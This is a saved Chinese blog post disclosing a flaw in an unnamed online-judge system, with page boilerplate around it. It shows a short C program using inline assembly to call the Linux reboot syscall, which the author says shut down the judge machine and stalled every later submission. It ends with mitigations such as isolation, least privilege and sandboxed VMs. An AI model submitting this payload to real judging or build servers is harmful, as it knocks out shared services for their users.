+<p>今天刚刚测试发现某OJ系统存在恶意代码执行漏洞，鉴于其危害性，本人将在管理员修复漏洞后公开细节。</p>
+<!--more-->
+<ul>
+<li>目标：某OJ评测系统评测机</li>
+<li>目的：卡死评测机或瘫痪整个服务器</li>
+<li>严重性：紧急</li>
+</ul>
+<hr>
+<h2>0x01：试探</h2>
+<p>由于OJ都设置了TLE时间，因此试图通过死循环之类程序中的时间占用卡死评测机是不可能的，但是编译时间一般没有限制，因此我们先从编译入手，来尝试</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;con&gt;</span></span></code></pre>
+<p>这个常见的坑爹代码。<br>
+很不幸，结果CE了，File not find，看来管理员对这个还是有一定了解，提前删掉了这个文件。<br>
+然后就是常见的文件操作，更不幸，作者在此项目的开源wiki上已经说明</p>
+<blockquote>
+<p>一切企图读入服务器上其他文件的请求将被评测系统拒绝</p>
+</blockquote>
+<p>那我就不费那个功夫了……</p>
+<h2>0x02：BUG出现</h2>
+<p>原本打算通过写一大堆模板增加编译时间，不过考虑到有提交大小限制也没什么可能实现，那么我们可不可以通过执行恶意代码来干掉评测机呢？<br>
+C/C++中有一个比较少用的特性，就是可以使用asm关键字直接在程序中插入汇编代码，刚好之前看逆向的时候看到过一个有趣的Linux汇编断电代码，扔到这里来试试。</p>
+<pre><code class="hljs properties"><span class="hljs-attr">int</span> <span class="hljs-string">main(){</span>
+    <span class="hljs-attr">__asm{</span>
+    <span class="hljs-attr">mov</span> <span class="hljs-string">0x4321fedc,edx</span>
+    <span class="hljs-attr">mov</span> <span class="hljs-string">0x5121996,ecx</span>
+    <span class="hljs-attr">mov</span> <span class="hljs-string">0xfee1dead,ebx</span>
+    <span class="hljs-attr">mov</span> <span class="hljs-string">0x58,eax</span>
+    <span class="hljs-attr">int</span> <span class="hljs-string">0x80</span>
+    <span class="hljs-attr">}</span>
+    <span class="hljs-attr">return</span> <span class="hljs-string">0;</span>
+<span class="hljs-attr">}</span></code></pre>
+<p>提交！蛤？CE了？？唔……这不科学啊，就算被屏蔽掉也不会是CE啊……错误信息：</p>
+<pre><code class="hljs less"><span class="hljs-attribute">error</span>: expected <span class="hljs-string">'('</span> before <span class="hljs-string">'{'</span> token __asm{</code></pre>
+<p>这个似乎表明g++并不支持这个关键字……好吧，VS用多了……我改！</p>
+<pre><code class="hljs perl"><span class="hljs-keyword">int</span> main(){
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"movl $0x4321FEDC,%edx"</span>);
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"movl $85072278,%ecx"</span>);
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"movl $0xfee1dead,%ebx"</span>);
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"movl $88,%eax"</span>);
+    __asm_<span class="hljs-number">_</span>(<span class="hljs-string">"int $0x80"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+<p>提交！哈！成功地把OJ卡到了【正在评测】状态，看来评测机已经被断电了吧O(∩_∩)O<br>
+这个OJ还没有并行处理，不一会儿就刷出了一片等待评测……<br>
+至此成功将评测机断电~</p>
+<h2>0x03：解决方法</h2>
+<ol>
+<li>评测机一定要和web隔离，这样出了事情也好通告</li>
+<li>敏感关键词提交时就要进行过滤，确保大部分恶意代码不会混进去</li>
+<li>评测环境的权限设置要规范，最好只给编译的程序最小运行权限</li>
+<li>编译环境隔离是最好的解决办法，整个虚拟机，到时候真出事了直接恢复快照</li>
+</ol></div>
+        </div>
+    </div>
+<!-- footer -->
+	<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-55'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-55'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+var registCommentEvent = function() {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+    var r = document.getElementById('respond-post-55');
+        
+    if (null != r) {
+        var forms = r.getElementsByTagName('form');
+        if (forms.length > 0) {
+            var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea[event.add](event.focus, function () {
+                    if (!added) {
+                        var input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = '_';
+                            input.value = (function () {
+    var _dgy6Bj = //'W'
+'W'+//'vdR'
+'vdR'+//'4F'
+'18a'+//'5y'
+'5y'+''///*'ss'*/'ss'
++'367'//'viI'
++/* 't'//'t' */''+//'b7S'
+'0'+//'PN'
+'0'+'Ii'//'Ii'
++//'vV'
+'bb8'+'6'//'1R'
++//'RZ3'
+'3'+//'gyH'
+'d2b'+'eb'//'O'
++//'vv'
+'5d'+'2'//'K'
++//'3n'
+'f59'+'d0'//'ol5'
++'d9f'//'K'
++'7'//'2c'
++'b'//'cl'
++''///*'yOt'*/'yOt'
++''///*'QUN'*/'QUN'
++'4'//'nK'
+, _cNV = [[0,1],[0,3],[3,5],[8,10]];
+    
+    for (var i = 0; i < _cNV.length; i ++) {
+        _dgy6Bj = _dgy6Bj.substring(0, _cNV[i][0]) + _dgy6Bj.substring(_cNV[i][1]);
+    }
+
+    return _dgy6Bj;
+})();
+                    
+                        f.appendChild(input);
+                        
+                        input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = 'checkReferer';
+                        input.value = 'false';
+                        
+                        f.appendChild(input);
+                        
+
+                        added = true;
+                    }
+                });
+            }
+        }
+    }
+};
+</script></div><!-- /content -->
+  <footer id="footer" class="app-footer" role="footer">
+    <div class="wrapper bg-light">
+      <span class="pull-right hidden-xs text-ellipsis">
+            Powered by <a target="_blank" href="http://www.typecho.org/">Typecho</a>&nbsp;|&nbsp;Theme by <a target="_blank" href="https://www.ihewro.com/archives/489/">handsome</a>&nbsp;|&nbsp;Modified by <a target="blank" href="https://www.imwxz.com/">imwxz</a>
+      </span>
+        <span class="text-ellipsis">©&nbsp;2021 Copyright&nbsp;| <a href="https://www.imwxz.com/feed/" target="_blank">RSS</a> | <a href="mailto:contact@imwxz.com" target="_blank">contact@imwxz.com</a></span>
+    </div>
+      <!--可以去除主题版权信息，最好保留版权信息或者添加主题信息到友链，谢谢你的理解-->
+            <style>
+          .topButton>.btn{
+              top: 0;
+          }
+          </style>
+      
+      <div class="topButton panel panel-default">
+          <button id="goToTop" class="fix-padding btn btn-default no-shadow pos-abt hide  border-radius-half-left" data-toggle="tooltip" data-placement="left" data-original-title="返回顶部">
+              <i class="fontello fontello-chevron-circle-up" aria-hidden="true"></i>
+          </button>
+      </div>
+  </footer>
+  </div><!--end of .app app-header-fixed-->
+
+
+
+
+        
+
+<!--定义全局变量-->
+
+
+    <style>
+        #mode_set{
+            display: none;
+        }
+    </style>
+
+<!--主题核心js-->
+<script>
+    SearchConfig = {
+        url: "https://www.imwxz.com/usr/plugins/Preference/cache/search.json"
+    }
+</script>
+
+
+
+    <script src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/function.js"></script>
+
+    <script src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/core.js"></script>
+
+
+
+    <!--全局播放器组件-->
+    <script>
+                var player = new skPlayer({"autoplay":false,"listshow":false,"mode":"listloop","music":{"type":"cloud","source":"1999459976","media":"netease"}});
+    </script>
+
+
+<script>
+    if ('serviceWorker' in navigator) {
+        if (LocalConst.USE_CACHE) {
+            navigator.serviceWorker.addEventListener('controllerchange', function (ev) {
+                try {
+                    $.message({
+                        title:"检测到本地缓存需要更新",
+                        message:"<a href='#' onclick='window.location.reload();'>点击刷新页面</a>更新本地缓存",
+                        type:'warning',
+                        time: '300000'
+                    });
+                }catch (e) {
+                }
+            });
+        }
+    }
+
+</script>
+
+<!--主题组件js加载-->
+    <script src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/jquery_002.js" type="text/javascript"></script>
+
+
+
+<!--pjax动画组件-->
+
+
+
+
+
+
+<!--截图插件-->
+<script src="%E6%9F%90OJ%E7%B3%BB%E7%BB%9F%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20-%20Matrix_files/html2canvas.js"></script>
+<!--主题组件js加载结束-->
+
+<!--用户自定义js-->
+<script type="text/javascript">
+    function tag_color(){
+    let tags = document.querySelectorAll("#tag_cloud-2 a");
+    let colorArr = ["#428BCA", "#AEDCAE", "#ECA9A7", "#DA99FF", "#FFB380", "#D9B999"];
+    tags.forEach(tag => {
+        tagsColor = colorArr[Math.floor(Math.random() * colorArr.length)];
+        tag.style.backgroundColor = tagsColor;
+    });
+}
+tag_color();</script>
+
+
+
+
+
+  	
+
+
+</body></html>
+<!--html end-->
+<!-- / footer -->
